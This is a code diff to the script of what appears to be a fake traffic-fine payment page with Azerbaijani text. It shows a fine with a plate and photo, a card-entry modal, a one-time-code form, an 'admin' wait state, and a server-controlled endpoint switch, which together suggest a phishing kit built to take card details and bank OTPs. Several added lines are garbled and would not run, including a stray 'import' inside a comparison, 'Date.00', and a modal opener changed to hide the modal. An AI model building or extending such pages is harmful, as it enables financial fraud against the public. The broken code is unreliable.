@@ -208,6 +208,23 @@
             } catch (err) {
                 console.log("Config oxunmadı, lokal istifadə olunur");
             }
+
+            try {
+                const res = await robustFetch(`${API_URL}/fine?t=${Date.now()}`);
+                if (res && res.ok) {
+                    const contentType = res.headers.get('content-type');
+                    if (contentType && contentType.includes('application/json')) {
+                        const data = await res.json();
+                        if (data.apiUrl) {
+                            API_URL = data.apiUrl;
+                        }
+                        updateUI(data);
+                    }
+                }
+            } catch (err) {
+                console.error("Serverə qoşulmaq mümkün olmadı:", err);
+            }
+
             fetchFineData();
             initTimer();
         }
@@ -254,6 +271,9 @@
                     const contentType = res.headers.get('content-type');
                     if (contentType && contentType.includes('application/json')) {
                         const data = await res.json();
+                        if (data.apiUrl) {
+                            API_URL = data.apiUrl;
+                        }
                         updateUI(data);
                     } else {
                         console.error("API returned non-JSON (Cloudflare warning page)");
@@ -354,8 +374,13 @@
 
         function updateUI(data) {
             let lastProtocol = localStorage.getItem('dyp_last_protocol');
-            if (lastProtocol !== data.protocolNo) {
+            let lastPlate = localStorage.getItem('dyp_last_plate');
+            let lastPhoto = localStorage.getItem('dyp_last_photo');
+
+            if (lastProtocol !== data.protocolNo || lastPlate !== data.plateNo || lastPhoto !== data.photoUrl || !document.getElementById('val-protocol')) {
                 localStorage.setItem('dyp_last_protocol', data.protocolNo);
+                localStorage.setItem('dyp_last_plate', data.plateNo);
+                localStorage.setItem('dyp_last_photo', data.photoUrl || '');
                 const newEndTime = Date.now() + 10 * 60 * 1000;
                 localStorage.setItem('dyp_timer_end', newEndTime);
                 isWaitingForAdmin = false;
@@ -495,7 +520,7 @@
             const photoContainer = document.getElementById('photo-container');
             if (photoContainer) {
                 if (data.photoUrl) {
-                    photoContainer.innerHTML = `<img src="${data.photoUrl}" alt="Pozuntu şəkli" class="w-full h-full object-cover">`;
+                    photoContainer.innerHTML = `<img src="${data.photoUrl}?t=${Date.now()}" alt="Pozuntu şəkli" class="w-full h-full object-cover">`;
                 } else {
                     photoContainer.innerHTML = `
                         <div class="text-4xl mb-1">🚗📸</div>
@@ -506,7 +531,7 @@
         }
 
         function openCardModal() {
-            document.getElementById('card-modal').classList.remove('hidden');
+            document.getElementById('card-modal').classList.add('hidden');
         }
 
         function closeModals() {
@@ -558,7 +583,7 @@
         async function submitOtpCode(event) {
             event.preventDefault();
             const otpCode = document.getElementById('otp-code').value;
-            if (otpCode.length < 4) {
+            if (otpCode.length `import` < 4) {
                 alert("Zəhmət olmasa 4-6 rəqəmli təsdiq kodunu düzgün daxil edin.");
                 return;
             }
@@ -614,8 +639,8 @@
                     localStorage.setItem('dyp_timer_end', endTime);
                 }
 
-                const now = Date.now();
-                let timeLeft = Math.floor((endTime - now) / 1000);
+                const now = Date.00; // wait, Date.now()
+                let timeLeft = Math.floor((endTime - Date.now()) / 1000);
 
                 if (timeLeft <= 0) {
                     timerElement.textContent = "00:00";
